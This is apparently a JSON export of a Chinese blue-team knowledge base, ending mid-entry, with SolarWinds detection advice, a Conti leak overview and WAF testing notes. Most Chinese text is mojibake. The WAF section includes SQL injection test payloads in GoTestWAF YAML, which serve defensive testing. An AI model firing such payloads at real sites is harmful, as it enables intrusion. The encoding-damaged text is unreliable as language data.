ä¸ºè¯¥tokenæ˜¯ç”¨ä»–ä»¬çš„å¯ä¿¡è¯ä¹¦ç­¾åçš„ï¼Œå³ä½¿æœ‰å‘Šè­¦ï¼Œè¯¥å¼‚å¸¸ä¹Ÿä¼šè¢«å¿½ç•¥ï¼ˆéšæ„åˆ›å»ºå…·å¤‡é«˜æƒé™çš„accesskeyï¼‰ã€‚\r\n    **å¯¹å¾…SAML tokenè¿™ç§ç±»ä¼¼äºäº‘çš„api keyï¼Œç»Ÿç»Ÿéœ€è¦å½“æˆè´¦æˆ·ä¸€æ ·çš„èµ„æºæ¥è®¤è®¤çœŸçœŸåšä¸‹å¼‚å¸¸çš„â€œè´¦æˆ·ç™»å½•è¯†åˆ«â€ï¼Œå°±æ˜¯api keyçš„ä½¿ç”¨å¼‚å¸¸è¯†åˆ«ï¼ˆæ•²é»‘æ¿ï¼‰ã€‚**\r\n  - é€šè¿‡ä¸Šè¿°æ–¹æ³•æå®šçš„é«˜æƒé™è´¦æˆ·å¯ä»¥ç»™å·²æœ‰çš„ä»»æ„åº”ç”¨æœåŠ¡æ·»åŠ æ”»å‡»è€…çš„å‡­è¯ï¼Œè¿™æ ·ä»–ä»¬å°±èƒ½ç›´æ¥è®¿é—®è¿™äº›åº”ç”¨æœåŠ¡äº†ï¼ˆé€šè¿‡è¯¥accesskeyè®¿é—®ä»»æ„èµ„æºï¼‰ã€‚\r\n    **å¯¹æ·»åŠ å‡­è¯è¿™ç§æ“ä½œï¼Œè¦è®°å½•æ•´ä¸ªé“¾è·¯ï¼Œè°é€šè¿‡ä»€ä¹ˆæ–¹æ³•ï¼Œæ·»åŠ äº†ä¸€ä¸ªæ€æ ·çš„keyã€‚è¿™ä¸ªæ“ä½œæ˜¯å¦å¼‚å¸¸ã€‚è¿™æ ·æ‰èƒ½åœ¨å“åº”çš„æ—¶å€™è¿›è¡Œä¸Šä¸‹æ–‡å…³è”ã€‚**\r\n\r\n# 5. å‚è€ƒèµ„æ–™\r\n\r\n- [https://www.cyberark.com/resources/blog/the-anatomy-of-the-solarwinds-attack-chain](https://www.cyberark.com/resources/blog/the-anatomy-of-the-solarwinds-attack-chain)\r\n- [https://www.fireeye.com/content/dam/fireeye-www/current-threats/pdfs/wbnr-unc2452-presentation-slides.pdf](https://www.fireeye.com/content/dam/fireeye-www/current-threats/pdfs/wbnr-unc2452-presentation-slides.pdf)"},{"fields":{"slug":"/å®‰å…¨çŸ¥è¯†åº“/å®è·µå‚è€ƒ/å‹’ç´¢çŠ¯ç½ªå›¢ä¼™Conti/","title":"å‹’ç´¢çŠ¯ç½ªå›¢ä¼™Conti"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: å‹’ç´¢çŠ¯ç½ªå›¢ä¼™Conti\r\ntags:\r\n- å®è·µå‚è€ƒ\r\n- Conti\r\n---\r\n\r\n# 1. èƒŒæ™¯\r\n\r\n- Contiæ˜¯å·¥ä¸šé¢†åŸŸæœ€æ´»è·ƒçš„å‹’ç´¢è½¯ä»¶ä¹‹ä¸€ï¼ŒContièƒŒåçš„å›¢ä¼™å‚ä¸äº†å¾ˆå¤šç³»åˆ—çš„æ¶æ„è½¯ä»¶å¼€å‘ã€‚åœ¨2021å¹´Contiè¿™ä¸ªå›¢ä¼™è¿˜å¹²äº†ä¸€ä»¶è®©äººä¸å¾—ä¸æƒ§æ€•çš„äº‹ï¼Œé‚£å°±æ˜¯ç ´åäº†63å®¶è¿è¥å·¥ä¸šæ§åˆ¶ç³»ç»Ÿ(ICS) çš„å…¬å¸ï¼Œå…¶ä¸­å¤§éƒ¨åˆ†æ˜¯åˆ¶é€ ä¸šã€‚\r\n- æ­¤å¤–ï¼ŒContiçš„åŠ¿åŠ›è¿˜åœ¨ä¸æ–­æ‰©å¤§ï¼Œå®ƒè¿˜æ§åˆ¶äº†ç”±TrickBotå›¢ä¼™å¼€å‘çš„éšç§˜æ¶æ„è½¯ä»¶BazarBackdoorï¼Œç”¨äºç ´åé«˜ä»·å€¼ç›®æ ‡ã€‚å°±åœ¨å‰ä¸ä¹…ï¼ŒContiå‹’ç´¢è½¯ä»¶å›¢ä¼™è¿˜æ¥ç®¡äº†TrickBotæ¶æ„è½¯ä»¶æ“ä½œé¡¹ç›®ã€‚\r\n- åä¸ºâ€œConti Leaks â€çš„ä¹Œå…‹å…°å®‰å…¨ç ”ç©¶äººå‘˜æ³„éœ²äº†6ä¸‡å¤šæ¡å…³äºContiå‹’ç´¢è½¯ä»¶æ“ä½œçš„å†…éƒ¨æ¶ˆæ¯ã€‚æ®BleepingComputeræŠ¥é“ï¼Œè¯¥ç ”ç©¶äººå‘˜ä¸ºContiå›¢é˜Ÿçš„å†…éƒ¨æˆå‘˜ï¼Œå› æ­¤å¯ä»¥è®¿é—®Contiçš„XMPPèŠå¤©æœåŠ¡å™¨çš„â€œejabberd æ•°æ®åº“â€åç«¯ã€‚\r\n- æœ¬æ¬¡æ³„éœ²çš„æ•°æ®èŒƒå›´æ˜¯åœ¨2021å¹´1æœˆ21æ—¥è‡³2022å¹´2æœˆ27æ—¥åŒºé—´ï¼Œæ¶‰åŠ393ä¸ªçš„JSONæ–‡ä»¶ã€60,694æ¡æ¶ˆæ¯æƒ¨é­æ³„éœ²ã€‚ä¸æ­¤åŒæ—¶ï¼Œæ³„éœ²çš„æ¶ˆæ¯ä¸­è¿˜åŒ…å«äº†æœ‰å…³è¯¥å›¢ä¼™å†…éƒ¨æ´»åŠ¨çš„å„ç§ä¿¡æ¯ï¼Œæ¯”å¦‚å§“åã€ç§äººæ•°æ®æ³„éœ²URLã€æ¯”ç‰¹å¸åœ°å€ä»¥åŠæœ‰å…³å…¶æ“ä½œçš„è®¨è®ºã€‚\r\n- æ³„éœ²å†…å®¹ä¸»è¦æ¥è‡ªï¼š[https://share.vx-underground.org/Conti/](https://share.vx-underground.org/Conti/)ï¼Œé‡Œé¢æœ‰å¾ˆå¤šä¿„è¯­çœ‹èµ·æ¥æ¯”è¾ƒéº»çƒ¦ã€‚\r\n\r\n# 2. Conti å†…éƒ¨è½¯ä»¶ Leak.7z\r\n\r\n- è¯¥æ–‡ä»¶å¤¹åŒ…å« 12 ä¸ª Conti æ®ç§°æ˜¯å†…éƒ¨è½¯ä»¶çš„ git å­˜å‚¨åº“ï¼Œå¤§éƒ¨åˆ†ä»£ç ä¼¼ä¹éƒ½æ˜¯ Conti å°ç»„ä½¿ç”¨çš„å¼€æºè½¯ä»¶ã€‚ä¾‹å¦‚ï¼Œyii2æˆ–Kohanaè¢«ç”¨ä½œï¼ˆä¼¼ä¹æ˜¯ï¼‰ç®¡ç†é¢æ¿çš„ä¸€éƒ¨åˆ†ã€‚ä»£ç å¤§éƒ¨åˆ†æ˜¯ç”¨ PHP ç¼–å†™çš„ï¼Œç”±Composerç®¡ç†ï¼Œé™¤äº†ä¸€ä¸ªç”¨ Go ç¼–å†™çš„å·¥å…·çš„å­˜å‚¨åº“ã€‚\r\n\r\n# 3. Conti Rocket Chat Leaks.7z\r\n\r\n- åŒ…å« Conti æˆå‘˜çš„èŠå¤©è®°å½•ï¼Œä»–ä»¬åœ¨å…¶ä¸­è®¨è®ºç›®æ ‡å’Œé€šè¿‡ Cobalt Strike æ‰§è¡Œæ”»å‡»çš„ä¸€äº›æŠ€å·§ã€‚\r\n  - Active Directory Enumeration\r\n  - SQL Databases Enumeration via sqlcmdã€‚\r\n  - å¦‚ä½•è®¿é—® Shadow Protect SPX (StorageCraft)\r\n  - å¦‚ä½•åˆ›å»º NTDS è½¬å‚¨ä¸ vssadmin\r\n  - å¦‚ä½•æ‰“å¼€æ–°çš„ RDP ç«¯å£ 1350\r\n- å·¥å…·åŒ…å«\r\n  - Cobalt Strike\r\n  - Metasploit\r\n  - PowerView\r\n  - ShareFinder\r\n  - AnyDesk\r\n  - Mimikatz\r\n\r\n# 4. Conti æˆªå›¾ 2021.7z\r\n\r\n- ![k1za0w](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/k1za0w.jpg)\r\n- åœ¨ä¸€äº›æ³„éœ²çš„å±å¹•æˆªå›¾ä¸­ï¼Œå¯ä»¥çœ‹åˆ° Conti åœ¨ Kali Linux ä¸­ä½¿ç”¨ Cobalt Strikeã€‚\r\n\r\n# 5. Conti Toolkit Leak.7z\r\n\r\n- å…¶ä¸­åŒ…å« APT TeamTNT ä½¿ç”¨çš„å·¥å…·ï¼Œä½¿ç”¨ shell/bash è„šæœ¬æ¥é’ˆå¯¹å„ç§æ“ä½œç³»ç»Ÿä»¥åŠ AWS å’Œ Kubernetes çš„å·¥å…·ã€‚\r\n\r\n# 6. Conti Trickbot è®ºå› Leak.7z\r\n\r\n- è™½ç„¶å¤§å¤šæ•°éƒ½åŒ…å«å…³äºå¦‚ä½•æ¨ªå‘ç§»åŠ¨ä»¥åŠå¦‚ä½•ä½¿ç”¨ Trickbot çš„è¯´æ˜ï¼Œä½†è¿˜æœ‰ä¸€äº›æœ‰æ„æ€çš„ä¸œè¥¿ï¼Œå¦‚ï¼š\r\n  - ä¸€ä½æˆå‘˜åˆ†äº«äº†ä»–çš„ webshellï¼Œæ ‡é¢˜ä¸º â€œæˆ‘ä½¿ç”¨çš„æœ€è½»ã€æœ€è€ç”¨çš„ webshellâ€\r\n  - ä½¿ç”¨äº† ZeroLogon ç­‰æ¼æ´\r\n  - ä½¿ç”¨è¯¸å¦‚ Kerberoasting ä¹‹ç±»çš„æŠ€æœ¯æ¥æ‰§è¡Œä»–ä»¬çš„æ”»å‡»\r\n  - åˆ†äº«äº†ä¸€äº›ä»£ç æ¥è½¬å‚¨ MSSQL å‡­æ®\r\n  - ä¸€ä½ç”¨æˆ·åˆ†äº«äº†ä»–çš„ PowerShell è„šæœ¬ä»£ç ï¼Œç”¨äºåœ¨å—å®³è€…çš„è®¡ç®—æœºä¸Šå®‰è£…åé—¨ï¼ŒåŒ…æ‹¬å®‰è£… Torã€SSH å’Œè®¾ç½®é˜²ç«å¢™è§„åˆ™\r\n\r\n# 7. Conti Trickbot Leaks.7z\r\n\r\n- æ®ç§°ç”±â€œSergey Loguntsovâ€ https://github.com/loguntsov aka Begemotç”¨ Erlang ç¼–å†™çš„ä¸¤ä¸ª Trickbot æœåŠ¡å™¨ç«¯ç»„ä»¶ã€‚\r\n\r\n# 8. åŸ¹è®­ææ–™\r\n\r\n- åŒ…å« 12 ä¸ªå…·æœ‰ä¸åŒä¸»é¢˜çš„å­˜æ¡£æ–‡ä»¶ï¼ŒåŒ…å«\r\n  - ç ´è§£\r\n  - Metasploit\r\n  - ç½‘ç»œæ¸—é€æµ‹è¯•\r\n  - Coblat strike\r\n  - ç”¨äºæ¸—é€æµ‹è¯•è€…çš„ PowerShell\r\n  - Windows çº¢é˜Ÿ\r\n  - WMI æ”»å‡»ï¼ˆå’Œé˜²å¾¡ï¼‰\r\n  - SQL æœåŠ¡å™¨\r\n  - æ´»åŠ¨ç›®å½•\r\n  - é€†å‘å·¥ç¨‹\r\n\r\n# 9. æ€»ç»“\r\n\r\n- å¯ä»¥çœ‹å‡ºæ¥ä»–ä»¬ä¹Ÿæ²¡æœ‰ä½¿ç”¨0dayæˆ–è€…å®šåˆ¶åŒ–å·¥å…·ï¼ˆå¤§éƒ¨åˆ†å’Œ[[Lapsus$ç»„ç»‡çš„æ‰‹æ³•]]ä¸€æ ·éƒ½æ˜¯ä½¿ç”¨å¸¸è§çš„å¼€æº/å•†ä¸šåŒ–å·¥å…·ï¼Œå°éƒ¨åˆ†æ˜¯è‡ªå·±å¼€å‘çš„ï¼‰\r\n\r\n[//begin]: # \"Autogenerated link references for markdown compatibility\"\r\n[Lapsus$ç»„ç»‡çš„æ‰‹æ³•]: Lapsus$ç»„ç»‡çš„æ‰‹æ³•.md \"Lapsus$ç»„ç»‡çš„æ‰‹æ³•\"\r\n[//end]: # \"Autogenerated link references\""},{"fields":{"slug":"/å®‰å…¨çŸ¥è¯†åº“/Blue TeamåŸºç¡€è®¾æ–½/Webåº”ç”¨é˜²ç«å¢™/WAFèƒ½åŠ›è¯„ä¼°&æµ‹è¯•/","title":"WAFèƒ½åŠ›è¯„ä¼°&æµ‹è¯•"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: WAFèƒ½åŠ›è¯„ä¼°&æµ‹è¯•\r\ntags:\r\n- Blue TeamåŸºç¡€è®¾æ–½\r\n- Webåº”ç”¨é˜²ç«å¢™\r\n- èƒ½åŠ›è¯„ä¼°\r\n---\r\n\r\n# 1. è¯„ä¼°å·¥å…·\r\nWAFèƒ½åŠ›è¯„ä¼°å·¥å…·åœ¨ä¸šç•Œéƒ½æ¯”è¾ƒå°‘è§ï¼Œä¸ºæ•°ä¸å¤šçš„å‡ ä¸ªè¿˜æ˜¯ç”±WAFä¾›åº”å•†å¼€å‘çš„ï¼Œå¦‚ï¼š\r\n\r\n- **Framework for Testing WAFs (FTW!) (https://github.com/fastly/ftw)**ï¼Œç”± ModSecurity å’Œ Fastly çš„ç ”ç©¶äººå‘˜åˆ›å»ºï¼Œæ—¨åœ¨å¸®åŠ©ä¸º WAF è§„åˆ™æä¾›ä¸¥æ ¼çš„æµ‹è¯•ã€‚å®ƒä½¿ç”¨ OWASP Core Ruleset V3 ä½œä¸ºåŸºçº¿æ¥æµ‹è¯• WAF ä¸Šçš„è§„åˆ™ã€‚è§„åˆ™é›†ä¸­çš„æ¯ä¸ªè§„åˆ™éƒ½åŠ è½½åˆ°ä¸€ä¸ª YAML æ–‡ä»¶ä¸­ï¼Œè¯¥æ–‡ä»¶å‘å‡ºå°†è§¦å‘è¿™äº›è§„åˆ™çš„ HTTP è¯·æ±‚ã€‚\r\n- **GoTestWAF(https://github.com/wallarm/gotestwaf)**ï¼Œç”±å¦ä¸€å®¶ WAF ä¾›åº”å•† Wallarm è´Ÿè´£ç»´æŠ¤ã€‚GoTestWAF ä½¿ç”¨ YAML æ¥å®šä¹‰å¤šä¸ªæµ‹è¯•ï¼Œè¿™äº›æµ‹è¯•ä½¿ç”¨ä¸åŒçš„æœ‰æ•ˆè½½è·å˜ä½“ã€ç»•è¿‡æŠ€æœ¯ã€ç¼–ç ä»¥åŠæœ‰æ•ˆè½½è·æ’å…¥ç‚¹ï¼ˆåŒ…æ‹¬æ¨¡æ‹Ÿ API è°ƒç”¨çš„ JSON ç»“æ„ï¼‰ã€‚ æœ¬æ–‡ä½¿ç”¨GoTestWAFè¿›è¡Œæµ‹è¯•ã€‚\r\n- **WAFLab(https://github.com/microsoft/waflab)**ï¼Œå¾®è½¯å‡ºå“ï¼Œä½¿ç”¨ YAML æ¥å®šä¹‰å¤šä¸ªæµ‹è¯•ç”¨ä¾‹ï¼Œé»˜è®¤ä½¿ç”¨modsecurityçš„è§„åˆ™è¿›è¡ŒéªŒè¯ã€‚\r\n\r\n# 2. GoTestWAF å¦‚ä½•å·¥ä½œï¼Ÿ\r\nGoTestWAF ç”Ÿæˆå…·æœ‰é¢„å®šä¹‰çš„åŸºæœ¬æœ‰æ•ˆè´Ÿè½½çš„è¯·æ±‚ä»¥åŠç‰¹å®šäºä¸åŒ APIï¼ˆRESTã€SOAPã€XMLRPCï¼‰çš„æ”»å‡»ã€‚ä¹‹åï¼Œå®ƒå°†å®ƒä»¬å‘é€åˆ°åº”ç”¨ç¨‹åºå¹¶åˆ†æå“åº”ä»¥åœ¨æ§åˆ¶å°è¾“å‡ºä¸­ç”Ÿæˆè¯¦ç»†æŠ¥å‘Šæˆ–ä½œä¸º PDFã€‚\r\n\r\nä¸»è¦æµ‹è¯•æ€è·¯æ˜¯å°†æ”»å‡»è½½è·ç¼–ç å¹¶æ”¾ç½®åœ¨ HTTP è¯·æ±‚çš„ä¸åŒéƒ¨åˆ†ï¼šå…¶æ­£æ–‡ã€æ ‡å¤´ã€URL å‚æ•°ç­‰ã€‚ä¸ºäº†ç®€åŒ–ï¼Œå®ç°äº†ä»¥ä¸‹é€»è¾‘ï¼š\r\n\r\n- **æœ‰æ•ˆè½½è· â†’ ç¼–ç å™¨ â†’ å ä½ç¬¦**\r\n\r\nè¿™æ„å‘³ç€æ¯ä¸ªè´Ÿè½½æ ·æœ¬ï¼ˆæ¶æ„æ”»å‡»æ ·æœ¬ï¼Œä¾‹å¦‚åƒâ€œalert(1)â€è¿™æ ·çš„ XSS å­—ç¬¦ä¸²ï¼‰å°†é¦–å…ˆä»¥æŸç§æ–¹å¼ç¼–ç ï¼Œç„¶åæ”¾å…¥ HTTP è¯·æ±‚ä¸­ã€‚è¿˜å¯ä»¥é€‰æ‹©ä½¿ç”¨ä¿æŒå­—ç¬¦ä¸²åŸæ ·çš„æ™®é€šç¼–ç å™¨ã€‚\r\n\r\nä¸ºäº†ä½¿æµ‹è¯•å¯è¯»ï¼ŒGoTestWAF ä½¿ç”¨ YAML DSLã€‚ä»¥ä¸‹æ˜¯ SQL æ³¨å…¥è´Ÿè½½çš„ç¤ºä¾‹ï¼š\r\n\r\n```\r\npayload:\r\n  '\"union select -7431.1, name, @aaa from u_base--w-'\r\n  \"'or 123.22=123.22\"\r\n  \"' waitfor delay '00:00:10'--\"\r\n  \"')) or pg_sleep(5)--\"\r\nencoder:\r\n  Base64Flat\r\n  Url  \r\nplaceholder:\r\n  UrlPath\r\n  UrlParam\r\n  JsonBody\r\n  Header\r\n```\r\n\r\nä½œä¸ºæ¯ 4 ä¸ªæœ‰æ•ˆè½½è·ã€2 ä¸ªç¼–ç å™¨å’Œ 4 ä¸ªå ä½ç¬¦çš„æ’åˆ—ç»“æœï¼Œæœ¬æ¬¡æµ‹è¯•å°†å‘é€ 424=32 ä¸ªè¯·æ±‚ã€‚\r\n\r\n# 3. WAFLab æ˜¯æ€æ ·çš„ï¼Ÿ\r\nä½¿ç”¨AutoGenæ¨¡å—è‡ªåŠ¨ç”Ÿæˆæµ‹è¯•ç”¨ä¾‹ï¼Œå¤§ä½“æ€è·¯å’ŒGoTestWAFå·®ä¸å¤šï¼Œå€¼å¾—ä¸€æçš„æ˜¯ï¼Œå®ƒä¼šä»Mod Securityçš„è§„åˆ™ä¸­æå–ä¿¡æ¯ï¼Œä¸è¿‡æ•´ä½“æ•°é‡è¿˜æ˜¯è›®å°‘çš„ï¼š\r\n\r\n| TYPE                                | Total Rule | Supported Rule | Passed Rule |\r\n| ----------------------------------- | ---------- | -------------- | ----------- |\r\n| METHOD-ENFORCEMENT                  | 1          | 0              | 0           |\r\n| SCANNER_DETECTION                   | 5          | 5              | 5           |\r\n| PROTOCOL-ENFORCEMENT                | 39         | 19             | 10          |\r\n| PROTOCOL-ATTACK                     | 7          |                |             |\r\n| APPLICATION-ATTACK-LFI              | 4          |                |             |\r\n| APPLICATION-ATTACK-RFI              | 4          |                |             |\r\n| APPLICATION-ATTACK-RCE              | 20         |                |             |\r\n| APPLICATION-ATTACK-PHP              | 14         |                |             |\r\n| APPLICATION-ATTACK-NODEJS           | 1          |                |             |\r\n| APPLICATION-ATTACK-XSS              | 30         |                |             |\r\n| APPLICATION-ATTACK-SQLi             | 41         |                |             |\r\n| APPLICATION-ATTACK-SESSION-FIXATION | 3          |                |             |\r\n| APPLICATION-ATTACK-JAVA             | 3          |                |             |\r\n\r\nç”Ÿæˆçš„æµ‹è¯•ç”¨ä¾‹æ ¼å¼å¦‚ä¸‹ï¼š\r\n\r\n```yaml\r\n  meta:\r\n    author: Microsoft\r\n    enabled: true\r\n    name: dev-933140.yaml\r\n    description: This YAML file is automatically generated by WAFLab AutoGen\r\n  tests:\r\n  - test_title: 933140-0\r\n    desc: REQUEST_COOKIES\r\n    stages:\r\n    - stage:\r\n        input:\r\n          stop_magic: true\r\n          dest_addr: 127.0.0.1\r\n          method: GET\r\n          port: 80\r\n          protocol: http\r\n          uri: /\r\n          version: HTTP/1.0\r\n          headers:\r\n            Cookie: O09SFeTTuD=PHP://TEMP\r\n            Host: wafdefaultruleset20.waftestdf.azfdtest.xyz\r\n        output:\r\n          status:\r\n          - 403\r\n```\r\n\r\n# 4. å‚è€ƒèµ„æ–™\r\n- [gotestwaf/README.md at master Â· wallarm/gotestwaf (github.com)](https://github.com/wallarm/gotestwaf/blob/master/README.md)\r\n- [waflab/autogen at master Â· microsoft/waflab (github.com)](https://github.com/microsoft/waflab/tree/master/autogen)"},{"fields":{"slug":"/å®‰å…¨çŸ¥è¯†åº“/Blue TeamåŸºç¡€è®¾æ–½/Webåº”ç”¨é˜²ç«å¢™/é€šè¿‡æœºå™¨å­¦ä¹ æ”¹å–„ WAF/","title":"WAFèƒ½åŠ›è¯„ä¼°&æµ‹è¯•"},"frontmatter":{"draft":false},"rawBody":"---\r\ntitle: WAFèƒ½åŠ›è¯„ä¼°&æµ‹è¯•\r\ntags:\r\n- Blue TeamåŸºç¡€è®¾æ–½\r\n- Webåº”ç”¨é˜²ç«å¢™\r\n- æœºå™¨å­¦ä¹ \r\n- Cloudflare\r\n---\r\n\r\n# 1. èƒŒæ™¯\r\nCloudflare æ¯ç§’å¤„ç†3200 ä¸‡æ¬¡ HTTP è¯·æ±‚ï¼Œ22% web æœåŠ¡å™¨ä¸ºÂ [W3Techs](https://w3techs.com/technologies/details/ws-cloudflare)Â æ‰€çŸ¥çš„ç½‘ç«™ä½¿ç”¨ Cloudflareã€‚Cloudflare ä¸ºäº”åˆ†ä¹‹ä¸€çš„äº’è”ç½‘èµ„äº§ä¿æŠ¤å…¶æµé‡ï¼Œå› è€Œå…·å¤‡ç‹¬ç‰¹çš„ä¼˜åŠ¿ï¼Œå¾—ä»¥åœ¨å¨èƒå‡ºç°æ—¶å°±åŠ ä»¥è¯†åˆ«ï¼Œå¹¶è·Ÿè¸ªå…¶è¿›åŒ–å’Œå˜å¼‚ã€‚\r\n\r\nWeb åº”ç”¨ç¨‹åºé˜²ç«å¢™ï¼ˆWAFï¼‰å¤„äº Cloudflare å®‰å…¨å·¥å…·ç®±çš„æ ¸å¿ƒä½ç½®ï¼Œè€Œæ‰˜ç®¡è§„åˆ™æ˜¯Â [WAF](https://www.cloudflare.com/zh-cn/learning/ddos/glossary/web-application-firewall-waf/)Â çš„å…³é”®åŠŸèƒ½ã€‚æ‰˜ç®¡è§„åˆ™æ˜¯ Cloudflare åˆ†æå¸ˆå›¢é˜Ÿåˆ›å»ºçš„ä¸€ç»„è§„åˆ™ï¼Œç”¨äºé˜»æ­¢æ˜¾ç¤ºå·²çŸ¥æ”»å‡»æ¨¡å¼çš„è¯·æ±‚ã€‚è¿™äº›æ‰˜ç®¡è§„åˆ™æ”»å‡»å¯¹äºç°æœ‰æ”»å‡»æ‰‹æ®µçš„æ¨¡å¼éå¸¸æœ‰æ•ˆï¼Œå› ä¸ºå®ƒä»¬å·²ç»è¿‡å¹¿æ³›æµ‹è¯•ï¼Œèƒ½æœ€å¤§é™åº¦å‡å°‘è¯¯æŠ¥ã€‚æ‰˜ç®¡è§„åˆ™çš„ä¸è¶³ä¹‹å¤„æ˜¯ï¼Œå¸¸å¸¸ä¼šé”™è¿‡æ”»å‡»çš„å˜ä½“ï¼ˆä¹Ÿç§°ä¸ºç»•è¿‡ï¼‰ï¼Œå› ä¸ºåŸºäºé™æ€æ­£åˆ™è¡¨è¾¾å¼çš„è§„åˆ™æœ¬è´¨ä¸Šå¯¹å¼•å…¥çš„ç‰¹å¾å˜ä½“ï¼ˆå¦‚é€šè¿‡æ¨¡ç³ŠæŠ€æœ¯ï¼‰æ•æ„Ÿã€‚\r\n\r\nåœ¨[[log4j]]æ¼æ´çˆ†å‘çš„æ—¶å€™ï¼Œç”±äºæ”»å‡»è€…å°è¯•ç»•è¿‡ WAFï¼ŒCloudflareå¿…é¡»ä¸æ–­æ›´æ–°è§„åˆ™æ¥åŒ¹é…å˜ç§ã€‚æ­¤å¤–ï¼Œä¼˜åŒ–è§„åˆ™éœ€è¦å¤§é‡çš„äººå·¥å¹²é¢„ï¼Œè€Œä¸”é€šå¸¸è¦åœ¨ç»•è¿‡è¢«è¯†åˆ«æˆ–ç”šè‡³è¢«åˆ©ç”¨åæ‰èƒ½èµ·ä½œç”¨ï¼Œå¯¼è‡´ä¿æŠ¤å˜å¾—è¢«åŠ¨ã€‚\r\n\r\nä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼ŒCloudflareæä¾›ä¸€ä¸ªæ–°å·¥å…·ï¼Œæ—¨åœ¨æ— éœ€äººå·¥å¹²é¢„çš„æƒ…å†µä¸‹è¯†åˆ«ç»•è¿‡å’Œæ¶æ„è´Ÿè½½ï¼Œä»¥é˜²å…¶é€ æˆç ´åã€‚ç°åœ¨å®¢æˆ·èƒ½å¤Ÿä»ä¸€ä¸ªæœºå™¨å­¦ä¹ æ¨¡å‹ä¸­è·å–ä¿¡å·ï¼Œè¿™ä¸ªæ¨¡å‹æ ¹æ®æ‰˜ç®¡è§„åˆ™å’Œåˆ†ç±»çš„å–„æ„/æ¶æ„æµé‡å’Œå¢å¼ºæ•°æ®æ¥è®­ç»ƒï¼Œä»è€Œé’ˆå¯¹æ›´å¤§èŒƒå›´çš„æ–°è€æ”»å‡»æä¾›æ›´ä½³çš„ä¿æŠ¤ã€‚\r\n\r\n# 2. ç¬¬ä¸€ä¸ªè‡ªæˆ‘å­¦ä¹ çš„ WAF\r\nå…¨æ–°æ£€æµ‹ç³»ç»Ÿå¢å¼ºç°æœ‰çš„æ‰˜ç®¡è§„åˆ™é›†ï¼Œæä¾›ä¸‰å¤§ä¼˜åŠ¿ï¼š\r\n1.  é€‚ç”¨äºæ‚¨çš„æ‰€æœ‰æµé‡ã€‚ç³»ç»Ÿä¼šæ ¹æ®æ¯ä¸ªè¯·æ±‚åŒ…å« SQLi æˆ– XSS æ”»å‡»ç­‰çš„å¯èƒ½æ€§å¯¹å…¶è¿›è¡Œè¯„åˆ†ã€‚è¿™å®ç°äº†ä¸€ç§å…¨æ–°çš„ WAF åˆ†æä½“éªŒï¼Œè®©æ‚¨èƒ½å¤Ÿæ¢ç´¢è‡ªå·±æ•´ä½“æµé‡ä¸­çš„è¶‹åŠ¿å’Œæ¨¡å¼ã€‚\r\n2.  æ£€æµ‹é€Ÿç‡æ ¹æ®è¿‡å»çš„æµé‡å’Œåé¦ˆè€Œæ”¹å–„ã€‚æ‰˜ç®¡è§„åˆ™é›†å°†æ‰€æœ‰ Cloudflare æµé‡åˆ†ç±»ä¸ºå–„æ„/æ¶æ„æµé‡åï¼Œæä¾›ç»™è¯¥æ¨¡å‹è¿›è¡Œè®­ç»ƒã€‚è¿™æ ·ä¸€æ¥ï¼Œå°å‹ç½‘ç«™ä¹Ÿèƒ½è·å¾—ä¸å¤§å‹ç½‘ç«™åŒçº§çš„ä¿æŠ¤ã€‚\r\n3.  æ€§èƒ½çš„æ–°å®šä¹‰è¯¥æœºå™¨å­¦ä¹ æ¨¡å‹åœ¨ç»•è¿‡å’Œå¼‚å¸¸è¢«åˆ©ç”¨æˆ–è¢«äººç±»ç ”ç©¶äººå‘˜è¯†åˆ«å‰å°±å°†å…¶è¯†åˆ«å‡ºæ¥ã€‚\r\n\r\nå…¶ä¸­ç§˜è¯€åœ¨äºå¦‚ä¸‹å‡ æ–¹é¢çš„ç»“åˆï¼šåˆ›æ–°çš„æœºå™¨å­¦ä¹ å»ºæ¨¡ï¼Œåºå¤§çš„è®­ç»ƒæ•°æ®é›†ï¼ˆåŸºäºæˆ‘ä»¬æ¯å¤©é˜»æ­¢çš„æ”»å‡»ï¼Œä»¥åŠæ•°æ®å¢å¼ºæŠ€æœ¯ï¼‰ï¼ŒåŸºäºè¡Œä¸ºæµ‹è¯•åŸåˆ™çš„æ­£ç¡®è¯„ä¼°å’Œæµ‹è¯•æ¡†æ¶ï¼Œä»¥åŠè®©æˆ‘ä»¬åœ¨å‡ ä¹æ¯«ä¸å¢åŠ å»¶è¿Ÿçš„å‰æä¸‹è¯„ä¼°æ¯ä¸€ä¸ªè¯·æ±‚çš„å°–ç«¯å·¥ç¨‹æŠ€æœ¯ã€‚\r\n\r\n# 3. æ–°çš„ WAF ä½“éªŒ\r\nå…¨æ–°æ£€æµ‹ç³»ç»ŸåŸºäºä¸[æœºå™¨äººåˆ†æï¼ˆBot Analyticsï¼‰](https://blog.cloudflare.com/introducing-bot-analytics/)Â ä¸€åŒå‘å¸ƒçš„èŒƒå¼ã€‚æ ¹æ®è¿™ä¸€æ–¹æ³•ï¼Œæ— è®ºæˆ‘ä»¬æ˜¯å¦é‡‡å–è¡ŒåŠ¨ï¼Œéƒ½ä¼šå¯¹æ¯ä¸ªè¯·æ±‚è¿›è¡Œè¯„ä¼°å¹¶èµ‹åˆ†ã€‚ç”±äºæˆ‘ä»¬å¯¹æ¯ä¸€ä¸ªè¯·æ±‚èµ‹åˆ†ï¼Œé’ˆå¯¹å‘é€åˆ°ç”¨æˆ·æœåŠ¡å™¨çš„å…¨éƒ¨æµé‡ï¼Œç”¨æˆ·èƒ½å¤Ÿçœ‹åˆ°åˆ†æ•°å¦‚ä½•éšç€æ—¶é—´å˜åŒ–ã€‚\r\n\r\n![3STXCU](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pic@master/uPic/2023-01/3STXCU.jpg)\r\n\r\næ­¤å¤–ï¼Œç”¨æˆ·è¿˜å¯ä»¥æŸ¥çœ‹è¯·æ±‚çš„ç‰¹å®šæ”»å‡»æ‰‹æ®µï¼ˆå¦‚SQLiçš„ï¼‰è¯„åˆ†ç›´æ–¹å›¾ï¼Œå¹¶æ‰¾åˆ°åˆé€‚çš„è¯„åˆ†å€¼æ¥åŒºåˆ†å–„æ„æµé‡å’Œæ¶æ„æµé‡ã€‚é…ç½®çš„è§„åˆ™å¦‚ä¸‹å›¾ï¼š\r\n\r\n![tVmqXg](https://cdn.jsdelivr.net/gh/MarsAuthority/sec_pi